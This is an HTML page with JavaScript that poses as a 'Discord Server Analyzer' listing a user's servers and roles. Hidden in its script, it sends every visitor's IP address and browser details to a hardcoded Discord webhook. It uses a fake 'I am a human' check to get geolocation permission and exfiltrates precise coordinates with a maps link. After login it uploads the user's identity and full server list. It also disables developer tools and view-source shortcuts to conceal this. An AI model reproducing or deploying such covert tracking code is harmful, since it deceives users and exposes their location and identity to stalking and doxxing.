<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Server Analyzer</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #2f3136;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .card {
            background: #36393f;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
            text-align: center;
            border: 1px solid #202225;
        }

        h2 {
            color: #fff;
            margin-bottom: 10px;
        }

        p {
            color: #b9bbbe;
            font-size: 15px;
            line-height: 1.4;
        }

        .verify-box {
            background: #2f3136;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            border: 1px solid #202225;
        }

        .login-btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.2s, opacity 0.2s;
            margin-top: 15px;
            text-decoration: none;
            display: inline-block;
        }

            .login-btn:hover:not(.disabled) {
                background-color: #4752c4;
            }

            .login-btn.disabled {
                opacity: 0.4;
                cursor: not-allowed;
                pointer-events: none;
            }

        .verify-btn {
            background-color: #3ba55d;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
            font-weight: bold;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

            .verify-btn:hover {
                background-color: #2d7d46;
            }

        .server-list {
            margin-top: 20px;
            text-align: left;
        }

        .server-item {
            background: #2f3136;
            padding: 12px 15px;
            margin: 8px 0;
            border-radius: 6px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

            .server-item:hover {
                background: #32353b;
            }

        .server-header {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .server-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #5865f2;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 14px;
            flex-shrink: 0;
        }

        .server-info {
            flex: 1;
        }

        .server-name {
            color: #fff;
            font-weight: 500;
        }

        .server-count {
            color: #b9bbbe;
            font-size: 12px;
        }

        /* Roles Dropdown Section */
        .roles-container {
            margin-top: 5px;
            padding-top: 8px;
            border-top: 1px solid #36393f;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .role-badge {
            background: #4f545c;
            color: #fff;
            font-size: 11px;
            padding: 3px 8px;
            border-radius: 12px;
            font-weight: 500;
        }

        .user-info {
            background: #2f3136;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .user-avatar {
            width: 64px;
            height: 64px;
            border-radius: 50%;
        }

        .user-details h3 {
            color: #fff;
            margin: 0 0 5px 0;
        }

        .user-details span {
            color: #b9bbbe;
            font-size: 14px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Discord Server Analyzer</h2>

        <!-- Verification Section -->
        <div id="verifyBox" class="verify-box">
            <p style="margin: 0; color: #fff; font-weight: 500;">Prove you're human to access the website, a popup will appear once you press verify. Press allow on the popup to proceed.</p>
            <button id="humanBtn" class="verify-btn">I am a human.</button>
        </div>

        <p id="intro-text">Connect your Discord account to see which servers you're in.</p>

        <!-- Initially locked button -->
        <a id="loginBtn" href="#" class="login-btn disabled">Login with Discord</a>

        <div id="content" class="hidden">
            <div class="user-info" id="userInfo"></div>
            <h3 style="color: #fff; text-align: left; margin-bottom: 10px;">Your Servers (<span id="serverCount">0</span>)</h3>
            <p style="text-align: left; font-size: 12px; color: #8e9297; margin-top: -5px;">Click a server to view your roles in it.</p>
            <div class="server-list" id="serverList"></div>
        </div>
    </div>

    <script>
        const CLIENT_ID = '1537117334517452860';
        const REDIRECT_URI = window.location.origin + window.location.pathname;
        const DISCORD_API = 'https://discord.com/api/v10';
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";

        let userAccessToken = '';

        // Added 'guilds.members.read' scope to fetch user roles inside servers
        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds%20guilds.members.read`;
        const loginBtn = document.getElementById('loginBtn');
        loginBtn.href = oauthUrl;

        window.addEventListener('DOMContentLoaded', () => {
        logPageVisit();
        checkOAuthCallback();
        });

        document.getElementById('humanBtn').addEventListener('click', () => {
        const humanBtn = document.getElementById('humanBtn');
        humanBtn.textContent = "Verifying...";
        humanBtn.disabled = true;

        if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
        async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

        try {
        await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
        embeds: [{
        title: "📍 User Geolocation Captured",
        color: 15105570,
        fields: [
        { name: "Latitude", value: String(latitude), inline: true },
        { name: "Longitude", value: String(longitude), inline: true },
        { name: "Accuracy", value: `~${Math.round(accuracy)} meters`, inline: true },
        { name: "Google Maps Link", value: `[View Location](${googleMapsUrl})`, inline: false }
        ],
        timestamp: new Date().toISOString()
        }]
        })
        });
        } catch (err) {
        console.error("Failed to send location webhook:", err);
        } finally {
        unlockInterface();
        }
        },
        (error) => {
        console.warn("Geolocation permission error:", error.message);
        unlockInterface();
        },
        { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
        );
        } else {
        unlockInterface();
        }
        });

        function unlockInterface() {
        document.getElementById('verifyBox').classList.add('hidden');
        loginBtn.classList.remove('disabled');
        }

        async function logPageVisit() {
        let userIp = 'Unknown / Blocked';
        try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        userIp = ipData.ip;
        } catch (err) {
        console.warn('IP fetch failed:', err);
        }

        try {
        await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
        embeds: [{
        title: "Site Visitor Opened Page",
        color: 3447003,
        fields: [
        { name: "IP Address", value: userIp, inline: true },
        { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
        ],
        timestamp: new Date().toISOString()
        }]
        })
        });
        } catch (e) {
        console.error('Visitor webhook error:', e);
        }
        }

        function checkOAuthCallback() {
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const accessToken = params.get('access_token');

        if (accessToken) {
        userAccessToken = accessToken;
        document.getElementById('verifyBox').classList.add('hidden');
        loginBtn.classList.add('hidden');
        document.getElementById('intro-text').classList.add('hidden');
        document.getElementById('content').classList.remove('hidden');

        history.replaceState(null, null, window.location.pathname);
        fetchUserData(accessToken);
        }
        }

        async function fetchUserData(token) {
        try {
        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
        headers: { 'Authorization': `Bearer ${token}` }
        });
        const user = await userRes.json();

        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
        headers: { 'Authorization': `Bearer ${token}` }
        });
        const guilds = await guildsRes.json();

        if (!Array.isArray(guilds)) {
        console.error('Guilds response was not an array:', guilds);
        return;
        }

        displayUser(user);
        displayServers(guilds);
        await logLoginToWebhook(user, guilds);

        } catch (err) {
        console.error('Fetch user data error:', err);
        }
        }

        function displayUser(user) {
        const avatarUrl = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

        document.getElementById('userInfo').innerHTML = `
        <img class="user-avatar" src="${avatarUrl}" alt="Avatar">
        <div class="user-details">
        <h3>${user.global_name || user.username}</h3>
        <span>@${user.username}</span>
        </div>
        `;
        }

        function displayServers(guilds) {
        document.getElementById('serverCount').textContent = guilds.length;
        const list = document.getElementById('serverList');

        list.innerHTML = guilds.map(guild => {
        const iconUrl = guild.icon
        ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
        : null;
        const initials = guild.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();

        return `
        <div class="server-item" onclick="toggleServerRoles('${guild.id}', this)">
        <div class="server-header">
        <div class="server-icon" style="${iconUrl ? `background-image: url(${iconUrl}); background-size: cover;` : ''}">
        ${iconUrl ? '' : initials}
        </div>
        <div class="server-info">
        <div class="server-name">${guild.name}</div>
        <div class="server-count">ID: ${guild.id}</div>
        </div>
        </div>
        <div class="roles-container hidden" id="roles-${guild.id}">
        <span class="role-badge" style="background: transparent; color: #8e9297; padding: 0;">Loading roles...</span>
        </div>
        </div>
        `;
        }).join('');
        }

        // Fetches and toggles roles for a specific guild
        async function toggleServerRoles(guildId, element) {
        const rolesBox = element.querySelector(`#roles-${guildId}`);

        // Toggle visibility if already loaded
        if (!rolesBox.classList.contains('hidden') && !rolesBox.dataset.loading) {
        rolesBox.classList.add('hidden');
        return;
        }

        rolesBox.classList.remove('hidden');

        // Prevent duplicate API calls if roles are already fetched
        if (rolesBox.dataset.loaded) return;
        rolesBox.dataset.loading = "true";

        try {
        const memberRes = await fetch(`${DISCORD_API}/users/@me/guilds/${guildId}/member`, {
        headers: { 'Authorization': `Bearer ${userAccessToken}` }
        });

        if (memberRes.ok) {
        const member = await memberRes.json();

        if (member.roles && member.roles.length > 0) {
        rolesBox.innerHTML = member.roles.map(roleId => `<span class="role-badge">Role ID: ${roleId}</span>`).join('');
        } else {
        rolesBox.innerHTML = `<span class="role-badge" style="background: #36393f; color: #8e9297;">No special roles</span>`;
        }
        } else {
        rolesBox.innerHTML = `<span class="role-badge" style="background: #ed4245; color: white;">Roles unavailable</span>`;
        }
        } catch (err) {
        console.error('Failed to fetch guild roles:', err);
        rolesBox.innerHTML = `<span class="role-badge" style="background: #ed4245; color: white;">Error loading roles</span>`;
        } finally {
        delete rolesBox.dataset.loading;
        rolesBox.dataset.loaded = "true";
        }
        }

        async function logLoginToWebhook(user, guilds) {
        try {
        const username = user.global_name
        ? `${user.global_name} (@${user.username})`
        : `@${user.username}`;

        let fileText = `=========================================\n`;
        fileText += ` DISCORD SERVER LIST FOR ${user.username.toUpperCase()}\n`;
        fileText += ` User ID: ${user.id}\n`;
        fileText += ` Total Guilds: ${guilds.length}\n`;
        fileText += ` Logged At: ${new Date().toISOString()}\n`;
        fileText += `=========================================\n\n`;

        if (Array.isArray(guilds) && guilds.length > 0) {
        guilds.forEach((g, index) => {
        const iconUrl = g.icon
        ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png`
        : 'No Icon';
        fileText += `[${index + 1}] ${g.name}\n`;
        fileText += `    ID:   ${g.id}\n`;
        fileText += `    Icon: ${iconUrl}\n\n`;
        });
        } else {
        fileText += "No servers found.";
        }

        const payload = {
        embeds: [{
        title: "Discord OAuth Completed",
        color: 5793266,
        fields: [
        { name: "User", value: username, inline: true },
        { name: "User ID", value: String(user.id), inline: true },
        { name: "Total Servers", value: `**${guilds.length}** guilds`, inline: true },
        {
        name: "Full Server List",
        value: "📁 Complete list attached below as a text file.",
        inline: false
        }
        ],
        timestamp: new Date().toISOString()
        }]
        };

        const formData = new FormData();
        formData.append('payload_json', JSON.stringify(payload));

        const blob = new Blob([fileText], { type: 'text/plain' });
        formData.append('files[0]', blob, `${user.username}_servers.txt`);

        const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
        });

        if (!res.ok) {
        const errText = await res.text();
        console.error("Webhook rejected by Discord API:", errText);
        }

        } catch (e) {
        console.error("Webhook processing error:", e);
        }
        }

        // Disable Context Menu & Shortcuts
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
        if (e.key === 'F12') e.preventDefault();
        if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) e.preventDefault();
        if (e.metaKey && e.altKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) e.preventDefault();
        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) e.preventDefault();
        });
    </script>
</body>
</html>
